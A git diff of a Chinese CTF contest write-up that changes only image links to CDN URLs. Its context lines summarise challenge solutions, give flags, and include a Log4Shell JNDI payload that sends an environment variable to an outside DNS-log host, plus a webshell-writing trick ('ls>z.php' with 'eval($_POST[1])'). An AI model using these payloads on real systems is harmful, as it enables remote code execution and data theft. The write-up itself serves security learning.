@@ -76,9 +76,9 @@ for i in range(1, len(ans)):
 
 最后得到一张隐隐约约有flag的图
 
-![1](image/D.I.E&Trinity-2022新生赛/image-20220124032436413.png)
+![1](https://cdn.jsdelivr.net/gh/KonDream/ctfshow-wp/D.I.E&Trinity-2022新生赛/image/D.I.E&Trinity-2022新生赛/image-20220124032436413.png)
 
-![image-20220124032647210](image/D.I.E&Trinity-2022新生赛/image-20220124032647210.png)
+![image-20220124032647210](https://cdn.jsdelivr.net/gh/KonDream/ctfshow-wp/D.I.E&Trinity-2022新生赛/image/D.I.E&Trinity-2022新生赛/image-20220124032647210.png)
 
 勉强能辨认吧，要瞎了
 
@@ -96,15 +96,15 @@ flag：flag{XqAe3QzK2ehD5fWv8jfBitPqHUw0}
 
 题目出题人换过了，最开始的附件是个doc，要手动改后缀。拿到压缩包找找有没有有用信息
 
-![image-20220124033444006](image/D.I.E&Trinity-2022新生赛/image-20220124033444006.png)
+![image-20220124033444006](https://cdn.jsdelivr.net/gh/KonDream/ctfshow-wp/D.I.E&Trinity-2022新生赛/image/D.I.E&Trinity-2022新生赛/image-20220124033444006.png)
 
 真滴有，下面那个打开发现需要密码，那密码就在key.txt中了，打开一看发现了问题
 
-![image-20220124033544163](image/D.I.E&Trinity-2022新生赛/image-20220124033544163.png)
+![image-20220124033544163](https://cdn.jsdelivr.net/gh/KonDream/ctfshow-wp/D.I.E&Trinity-2022新生赛/image/D.I.E&Trinity-2022新生赛/image-20220124033544163.png)
 
 零宽隐写，在线解一下：http://330k.github.io/misc_tools/unicode_steganography.html
 
-![image-20220124033721415](image/D.I.E&Trinity-2022新生赛/image-20220124033721415.png)
+![image-20220124033721415](https://cdn.jsdelivr.net/gh/KonDream/ctfshow-wp/D.I.E&Trinity-2022新生赛/image/D.I.E&Trinity-2022新生赛/image-20220124033721415.png)
 
 这个字符串有点问题，后面出题人说过了，应该是Because I like naruto best
 
@@ -112,15 +112,15 @@ flag：flag{XqAe3QzK2ehD5fWv8jfBitPqHUw0}
 
 常见的要么是拼二维码，要么是转字符串。从字符串的长度来看拼二维码过于勉强(其实我拼了，没什么特别的)，所以考虑后者
 
-![image-20220124034701819](image/D.I.E&Trinity-2022新生赛/image-20220124034701819.png)
+![image-20220124034701819](https://cdn.jsdelivr.net/gh/KonDream/ctfshow-wp/D.I.E&Trinity-2022新生赛/image/D.I.E&Trinity-2022新生赛/image-20220124034701819.png)
 
 观察字符串，前8位转10进制是100，对应d，后面以此类推，得到
 
-![image-20220124035003257](image/D.I.E&Trinity-2022新生赛/image-20220124035003257.png)
+![image-20220124035003257](https://cdn.jsdelivr.net/gh/KonDream/ctfshow-wp/D.I.E&Trinity-2022新生赛/image/D.I.E&Trinity-2022新生赛/image-20220124035003257.png)
 
 明显是图片的base64，最后解出来的图片就是flag
 
-![image-20220124035151349](image/D.I.E&Trinity-2022新生赛/image-20220124035151349.png)
+![image-20220124035151349](https://cdn.jsdelivr.net/gh/KonDream/ctfshow-wp/D.I.E&Trinity-2022新生赛/image/D.I.E&Trinity-2022新生赛/image-20220124035151349.png)
 
 flag：flag{57dd74fb21bb1aee50f19421bf836f23}
 
@@ -399,7 +399,7 @@ $o = x($o,$k);
 echo gzuncompress($o);
 ```
 
-![image-20220124143233127](image/D.I.E&Trinity-2022新生赛/image-20220124143233127.png)
+![image-20220124143233127](https://cdn.jsdelivr.net/gh/KonDream/ctfshow-wp/D.I.E&Trinity-2022新生赛/image/D.I.E&Trinity-2022新生赛/image-20220124143233127.png)
 
 解出flag：flag{_!N0W_u_get_lawf1ve's~shell}
 
@@ -447,7 +447,7 @@ if(isset($_GET['c'])){
 
 基本是和空格说拜拜了，ls看一眼
 
-![image-20220124040013238](image/D.I.E&Trinity-2022新生赛/image-20220124040013238.png)
+![image-20220124040013238](https://cdn.jsdelivr.net/gh/KonDream/ctfshow-wp/D.I.E&Trinity-2022新生赛/image/D.I.E&Trinity-2022新生赛/image-20220124040013238.png)
 
 好家伙。。这题原意是有一个名叫A**<?php**的文件，还有个**eval($_POST[1]);?>**的文件，预期解是执行**ls>z.php**，将所有文件名输入到z.php中，这样就得到了马，但是限制也很明显，不能传文件名字典序在两个马之间的，否则写进去的马无法执行，就比如图里的4-7行。我刚做的时候有个人就写了个a，所以现在只能拿别人的马来用了。
 
@@ -455,7 +455,7 @@ if(isset($_GET['c'])){
 
 非预期了，直接命令执行
 
-![image-20220124040749074](image/D.I.E&Trinity-2022新生赛/image-20220124040749074.png)
+![image-20220124040749074](https://cdn.jsdelivr.net/gh/KonDream/ctfshow-wp/D.I.E&Trinity-2022新生赛/image/D.I.E&Trinity-2022新生赛/image-20220124040749074.png)
 
 ## Not Loginme
 
@@ -471,7 +471,7 @@ flag：flag{d0not_g1veup!C0me_on}
 
 payload：${jndi:ldap://xxxx.dnslog.cn/${env:FLAG}}
 
-![image-20220124041449353](image/D.I.E&Trinity-2022新生赛/image-20220124041449353.png)
+![image-20220124041449353](https://cdn.jsdelivr.net/gh/KonDream/ctfshow-wp/D.I.E&Trinity-2022新生赛/image/D.I.E&Trinity-2022新生赛/image-20220124041449353.png)
 
 成功带出flag：flag{Phew, I am glad I code everything in PHP anyhow :) - :( :( :(}
 
@@ -481,7 +481,7 @@ payload：${jndi:ldap://xxxx.dnslog.cn/${env:FLAG}}
 
 下个Netron，随便翻翻就有了
 
-![image-20220124041657636](image/D.I.E&Trinity-2022新生赛/image-20220124041657636.png)
+![image-20220124041657636](https://cdn.jsdelivr.net/gh/KonDream/ctfshow-wp/D.I.E&Trinity-2022新生赛/image/D.I.E&Trinity-2022新生赛/image-20220124041657636.png)
 
 flag：flag{0xdf2a78e_you_are_right!^v^}
 
@@ -505,7 +505,7 @@ netron.start(modelPath)
 
 得到个压缩包，打开翻翻
 
-![image-20220124042109643](image/D.I.E&Trinity-2022新生赛/image-20220124042109643.png)
+![image-20220124042109643](https://cdn.jsdelivr.net/gh/KonDream/ctfshow-wp/D.I.E&Trinity-2022新生赛/image/D.I.E&Trinity-2022新生赛/image-20220124042109643.png)
 
 base64解
 
@@ -556,7 +556,7 @@ print(dnn(x))
 
 比如初始字符是 'f'，找到f的下一个
 
-![image-20220124044307671](image/D.I.E&Trinity-2022新生赛/image-20220124044307671.png)
+![image-20220124044307671](https://cdn.jsdelivr.net/gh/KonDream/ctfshow-wp/D.I.E&Trinity-2022新生赛/image/D.I.E&Trinity-2022新生赛/image-20220124044307671.png)
 
 根据预测结果看到第二个最接近0.6，在ans中索引得到 'l'
 
